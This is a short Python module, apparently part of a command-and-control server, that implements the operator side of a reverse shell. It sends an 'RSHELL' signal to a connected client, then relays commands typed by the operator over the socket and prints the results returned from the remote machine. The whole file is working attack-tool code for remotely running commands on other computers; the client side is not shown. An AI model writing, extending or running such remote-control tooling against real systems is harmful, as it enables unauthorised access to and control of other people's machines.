# commands/rshell.py
import subprocess
import threading

from Server.console_handler import command_finished

requires_id = True

def execute(conn, args, clients, id):
    command_finished.clear()
    conn.sendall(b'RSHELL')
    threading.Thread(target=rshell_thread, args=(conn,), daemon=True).start()

def rshell_thread(conn):
    while True:
        command = input("Enter command for reverse shell (type exit to leave the reverse shell): ")
        if command.lower() == 'exit':
            command_finished.set()
            break
        conn.sendall(command.encode())
        results = conn.recv(1024)
        print("Received results: {}".format(results.decode('utf-8')))